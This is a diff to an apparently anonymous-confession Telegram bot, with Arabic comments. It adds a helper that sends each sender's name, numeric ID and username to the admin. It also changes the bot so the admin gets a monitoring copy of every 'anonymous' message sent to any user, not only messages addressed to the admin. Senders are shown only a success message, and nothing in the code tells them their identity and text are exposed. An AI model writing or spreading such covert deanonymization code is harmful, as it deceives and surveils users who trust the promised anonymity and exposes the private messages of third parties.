@@ -84,7 +84,14 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     sender_name = sender.first_name if sender.first_name else "مجهول"
     current_time = datetime.now().strftime("%Y/%m/%d - %I:%M:%S %p")
 
-    # نظام الرد المباشر (Reply)
+    # دالة موحدة لإرسال معلومات المرسل إلك أنتِ وحدك دايماً
+    async def send_admin_info():
+        await context.bot.send_message(
+            chat_id=MY_ADMIN_ID,
+            text=f"👤 معلومات المرسل:\n- الاسم: {sender_name}\n- الأيدي: {sender_id}\n- اليوزر: {sender_username}"
+        )
+
+    # 1. نظام الرد المباشر (Reply)
     if update.message.reply_to_message:
         replied_msg_id = update.message.reply_to_message.message_id
         if replied_msg_id in message_to_sender:
@@ -105,12 +112,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
             await update.message.reply_text("✅ تم الرد على هذه الرسالة بنجاح")
             
-            # إرسال تقريب للمديرة
+            # إرسال التقرير والمعلومات للمديرة فوراً
             await context.bot.send_message(chat_id=MY_ADMIN_ID, text=f"📋 [مراقبة رد] تم إرسال رد إلى ({original_sender_id}):\n\n{message_text}")
-            await context.bot.send_message(
-                chat_id=MY_ADMIN_ID,
-                text=f"👤 معلومات المرسل:\n- الاسم: {sender_name}\n- الأيدي: {sender_id}\n- اليوزر: {sender_username}"
-            )
+            await send_admin_info()
             return
 
     is_via_link = context.user_data.get('is_via_link', False)
@@ -132,16 +136,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         await update.message.reply_text("تم إرسال صراحتك بنجاح 🥷✨")
         
-        # إرسال المعلومات للمديرة دائماً
-        if target_id != MY_ADMIN_ID:
-            await context.bot.send_message(chat_id=MY_ADMIN_ID, text=f"📋 [مراقبة صارحني] رسالة أُرسلت إلى المستخدم ({target_id}):\n\n{message_text}")
-        else:
-            await context.bot.send_message(chat_id=MY_ADMIN_ID, text=f"💌 وصلت صراحة مباشرة إليكِ:\n\n{message_text}")
-            
-        await context.bot.send_message(
-            chat_id=MY_ADMIN_ID,
-            text=f"👤 معلومات المرسل:\n- الاسم: {sender_name}\n- الأيدي: {sender_id}\n- اليوزر: {sender_username}"
-        )
+        # إرسال نسخة المراقبة والمعلومات الكاملة إلك كمديرة بغض النظر لمن أُرسلت الرسالة
+        await context.bot.send_message(chat_id=MY_ADMIN_ID, text=f"📋 [مراقبة صارحني] رسالة أُرسلت إلى المستخدم ({target_id}):\n\n{message_text}")
+        await send_admin_info()
         
         if sender_id in user_targets:
             del user_targets[sender_id]
@@ -161,10 +158,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         sent_msg = await context.bot.send_message(chat_id=MY_ADMIN_ID, text=formatted_direct)
         message_to_sender[sent_msg.message_id] = sender_id
         
-        await context.bot.send_message(
-            chat_id=MY_ADMIN_ID,
-            text=f"👤 معلومات المرسل:\n- الاسم: {sender_name}\n- الأيدي: {sender_id}\n- اليوزر: {sender_username}"
-        )
+        await send_admin_info()
         await update.message.reply_text("تم إرسال رسالتك للبوت بنجاح ✨")
 
 if __name__ == '__main__':
